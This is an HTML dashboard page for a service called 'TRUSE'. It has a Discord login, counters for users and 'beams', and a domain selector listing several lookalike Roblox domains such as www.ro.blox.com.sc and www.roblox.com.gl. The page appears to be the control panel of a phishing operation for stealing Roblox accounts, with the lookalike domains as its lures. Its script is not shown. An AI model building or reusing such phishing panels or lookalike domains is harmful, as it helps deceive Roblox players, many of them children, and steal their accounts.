<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>TRUSE</title>
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <link rel="stylesheet" href="cosmic.css">
  <link rel="icon" href="https://api.iconify.design/mdi/rocket-launch-outline.svg?color=%23c7f5ff">
</head>
<body>
  <canvas id="cosmic-bg"></canvas>
  <!-- Landing/Login Page -->
  <div class="cosmic-center" id="loginScreen">
    <div class="hero-block">
      <div class="hero-top">
        <div>
          <div class="hero-metric">8.3K<br><span>Total Users</span></div>
        </div>
        <div>
          <div class="hero-metric">30.6K<br><span>Total Beams</span></div>
        </div>
      </div>
      <h1 class="cosmic-gradient cosmic-glow">TRUSE</h1>
      <p class="cosmic-desc">Welcome! We provide cosmic-tier services and always do the latest update, since 2020.</p>
      <button class="discord-btn" onclick="window.location.href='https://discord.com/oauth2/authorize?client_id=1381144719371014144&permissions=0&integration_type=1&scope=bot'">
        <img src="https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/svg/1f47e.svg" alt="discord" height="22" style="vertical-align:middle;margin-right:10px;">
        Continue with Discord
      </button>
    </div>
  </div>

  <!-- Dashboard -->
  <div id="dashboardScreen" style="display:none;">
    <div class="sidebar cosmic-glow">
      <div class="sidebar-title">TRUSE</div>
      <ul>
        <li class="nav-item active" data-page="dashboard"><span>ü™ê</span> Dashboard</li>
        <li class="nav-item" data-page="settings"><span>‚öôÔ∏è</span> Settings</li>
      </ul>
      <div class="sidebar-user cosmic-glow" onclick="toggleUserMenu()">
        <img src="https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/svg/1f47e.svg" alt="discord" width="32" style="vertical-align:middle;">
        <span>CosmicUser</span>
      </div>
    </div>
    <div class="main cosmic-main">
      <!-- Dashboard Page -->
      <div class="page" id="dashboardPage">
        <div class="domains-bar">
          <span class="domains-label">Domains:</span>
          <button class="domain-btn" data-domain="www.ro.blox.com.sc">www.ro.blox.com.sc</button>
          <button class="domain-btn" data-domain="www.roblox.com.gl">www.roblox.com.gl</button>
          <button class="domain-btn" data-domain="www.roblox.com.am">www.roblox.com.am</button>
          <button class="domain-btn" data-domain="www.roblox.com.tg">www.roblox.com.tg</button>
        </div>
        <div id="domainContent">
          <!-- Content switches by domain section below -->
        </div>
      </div>
      <!-- Settings Page -->
      <div class="page" id="settingsPage" style="display:none;">
        <h2 class="cosmic-gradient cosmic-glow">Settings</h2>
        <div class="settings-content">
          <p>Settings are coming soon!</p>
        </div>
      </div>
    </div>
  </div>

  <!-- User menu dropdown -->
  <div id="userMenu" class="user-menu cosmic-panel" style="display:none;">
    <div style="font-weight:bold;">CosmicUser</div>
    <div style="font-size:0.95em;">@cosmicuser</div>
    <hr style="margin:10px 0;border:0;border-top:1px solid #233;">
    <button onclick="logout()" class="cosmic-btn cosmic-glow" style="width:100%;">Log Out</button>
  </div>

  <script src="cosmic.js"></script>
</body>
</html>
